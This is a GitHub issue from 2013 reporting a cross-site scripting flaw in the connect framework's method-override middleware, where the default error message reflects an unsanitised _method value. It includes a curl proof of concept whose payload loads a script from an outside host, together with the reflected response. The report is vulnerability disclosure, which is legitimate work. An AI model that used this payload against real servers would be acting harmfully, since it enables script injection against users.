## Description

[![@m13](https://avatars.githubusercontent.com/u/473318?u=ad063240c7fe9e816e7a53ddf22c8546ff279edb&v=4&size=48)](/m13)[m13](https://github.com/m13)opened [on Jun 27, 2013](https://github.com/senchalabs/connect/issues/831#issue-16093988)

This middleware overwrite req.method with the req.body['\_method'] value. When you don't catch the error it responds with a default error msg: "Cannot [METHOD] [URL]" (

[connect/lib/proto.js](https://github.com/senchalabs/connect/blob/6db901f967036ccc3c892b4bcb5bcb59e0b0dca9/lib/proto.js#L155)

Line 155
in
[6db901f](/senchalabs/connect/commit/6db901f967036ccc3c892b4bcb5bcb59e0b0dca9)

|  | res.end('Cannot ' + req.method + ' ' + utils.escape(req.originalUrl)); |
| --- | --- |

). Because this is not enough sanitized, you can force a Cross-Site Scripting in the response:
```
~ curl "localhost:3000" -d "_method=<script src=http://martes13.net/a.js></script>"
Cannot <SCRIPT SRC=HTTP://MARTES13.NET/A.JS></SCRIPT> /

```

This is very dangerous because in a server like ExpressJS it won't be handled with a app.all('/\*', ...), so all servers using this middleware are vulnerable.

To fix this hole, I don't know if it is better to fix the proto.js#L155 or the middleware.
